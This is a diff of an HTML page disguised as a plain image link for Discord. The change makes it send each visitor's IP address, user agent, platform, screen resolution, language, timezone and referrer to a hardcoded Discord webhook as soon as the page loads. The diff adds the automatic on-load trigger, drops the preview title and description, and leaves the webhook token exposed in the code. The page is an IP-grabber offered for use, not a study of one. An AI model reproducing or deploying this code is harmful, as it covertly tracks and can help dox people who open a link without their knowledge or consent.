@@ -5,59 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image</title>
     
-    <meta property="og:title" content="Image intéressante">
+    <!-- Meta tags pour l'affichage sur Discord -->
+    <meta property="og:title" content="">
     <meta property="og:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="800">
-    <meta property="og:description" content="Découvrez cette image magnifique">
+    <meta property="og:description" content="">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://ton-username.github.io/ton-repo/">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Image intéressante">
-    <meta name="twitter:description" content="Découvrez cette image magnifique">
-    <meta name="twitter:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
     
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .image-container {
-            position: relative;
-            max-width: 100%;
-            max-height: 100vh;
         }
         img {
-            max-width: 100%;
-            max-height: 100vh;
-            display: block;
-        }
-        .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.01);
-            z-index: 10;
-            cursor: pointer;
+            height: 100vh;
+            object-fit: contain;
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image">
-        <div class="overlay" onclick="trackClick()"></div>
-    </div>
+    <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image" onclick="trackClick()">
     
     <script>
+        // Envoie les infos immédiatement au chargement de la page
+        document.addEventListener('DOMContentLoaded', function() {
+            trackClick();
+        });
+        
         function trackClick() {
             const userAgent = navigator.userAgent;
             const language = navigator.language;
@@ -67,6 +45,7 @@
             const timestamp = new Date().toISOString();
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             
+            // Récupère l'adresse IP
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -83,19 +62,19 @@
             const webhookUrl = "https://discord.com/api/webhooks/1506765844166873200/hw2mE5yGAGATPIlxXgAwMkmlDV7hT9BKuFScjkBH4sbCNRGsAvIsN51mW8iYonjQQKbc";
             
             const embed = {
-                title: "New click on your track image",
+                title: "🖱️ Nouveau clic sur l'image",
                 color: 5814783,
                 thumbnail: {
                     url: "https://picsum.photos/seed/tracker/1200/800.jpg"
                 },
                 fields: [
-                    { name: "IP Adress", value: ip, inline: true },
-                    { name: "Platform", value: platform, inline: true },
-                    { name: "Screen Res", value: screenResolution, inline: true },
-                    { name: "Language", value: language, inline: true },
-                    { name: "TimeZone", value: timezone, inline: true },
-                    { name: "Referer", value: referer, inline: false },
-                    { name: "User agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
+                    { name: "📍 Adresse IP", value: ip, inline: true },
+                    { name: "💻 Plateforme", value: platform, inline: true },
+                    { name: "🖥️ Résolution d'écran", value: screenResolution, inline: true },
+                    { name: "🌐 Langue", value: language, inline: true },
+                    { name: "🕐 Fuseau horaire", value: timezone, inline: true },
+                    { name: "🔗 Page d'origine", value: referer, inline: false },
+                    { name: "🔍 User Agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
                 ],
                 footer: {
                     text: `Date: ${timestamp}`
@@ -103,9 +82,9 @@
             };
             
             const payload = {
-                username: "Image Tracker",
+                username: "Tracker d'image",
                 avatar_url: "https://picsum.photos/seed/tracker/1200/800.jpg",
-                content: "Someone click on your track image",
+                content: "Quelqu'un a cliqué sur votre image de tracking !",
                 embeds: [embed]
             };
             
@@ -118,13 +97,13 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    console.error('Error when send webhook discord :', response.statusText);
+                    console.error('Erreur lors de l\'envoi du webhook Discord:', response.statusText);
                 } else {
-                    console.log('Info send correctly');
+                    console.log('Informations envoyées avec succès à Discord');
                 }
             })
             .catch(error => {
-                console.error('Error network:', error);
+                console.error('Erreur réseau:', error);
             });
         }
     </script>
